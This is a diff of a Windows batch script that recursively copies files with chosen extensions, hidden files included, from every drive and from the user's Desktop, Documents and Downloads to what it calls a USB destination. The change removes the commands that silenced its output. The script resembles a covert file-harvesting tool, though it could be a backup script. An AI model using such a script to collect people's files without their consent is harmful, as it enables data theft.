@@ -25,16 +25,16 @@ for /f %%D in ('wmic logicaldisk get caption ^| findstr /r "[A-Z]:"') do (
         REM Search for files with specified extensions on the drive and copy them to the destination folder
         for %%E in (%extensions%) do (
             REM Search for files recursively and copy them to the destination folder
-            xcopy "%%D\*%%~nxE" "%destination%" /s /i /y /h >nul 2>&1
+            xcopy "%%D\*%%~nxE" "%destination%" /s /i /y /h
             REM Debug output: Display number of files copied
         )
     )
 )
 
 for %%E in (%extensions%) do (
-    xcopy "%USERPROFILE%\Desktop\*%%~nxE" "%destination%" /s /i /y /h >nul 2>&1
-    xcopy "%USERPROFILE%\Documents\*%%~nxE" "%destination%" /s /i /y /h >nul 2>&1
-    xcopy "%USERPROFILE%\Downloads\*%%~nxE" "%destination%" /s /i /y /h >nul 2>&1
+    xcopy "%USERPROFILE%\Desktop\*%%~nxE" "%destination%" /s /i /y /h
+    xcopy "%USERPROFILE%\Documents\*%%~nxE" "%destination%" /s /i /y /h
+    xcopy "%USERPROFILE%\Downloads\*%%~nxE" "%destination%" /s /i /y /h
 )
 
 echo All files copied to USB.
